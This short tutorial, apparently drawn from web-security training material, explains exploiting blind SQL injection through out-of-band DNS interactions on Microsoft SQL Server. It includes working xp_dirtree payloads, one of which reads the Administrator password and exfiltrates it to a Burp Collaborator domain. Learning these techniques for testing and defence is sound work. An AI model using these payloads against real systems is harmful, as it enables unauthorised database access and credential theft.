# Out-of-band Injection

**Exploiting blind SQL injection using out-of-band (OAST) techniques**

Here the application's response does not depend on the query returning data, on a database error, or on the query's execution time.

To exploit this, you need to trigger out-of-band network interactions to a system you control. 

These interactions can be triggered based on an injected condition to deduce information one piece at a time. More usefully, data can be exfiltrated directly within the network interaction.

Techniques for triggering a DNS request are specific to the type of database being used. For example, the following input on Microsoft SQL Server can be used to trigger a DNS lookup on the domain `0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net`:

```sql
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

After confirming a way to trigger out-of-band interactions, you can use the out-of-band channel to exfiltrate data from the vulnerable application. For example:

```sql
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

This input reads the administrator user's password, appends a unique collaborator subdomain, and triggers a DNS lookup. This lookup allows you to view the captured password:

```
{S3curePassword}.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
```
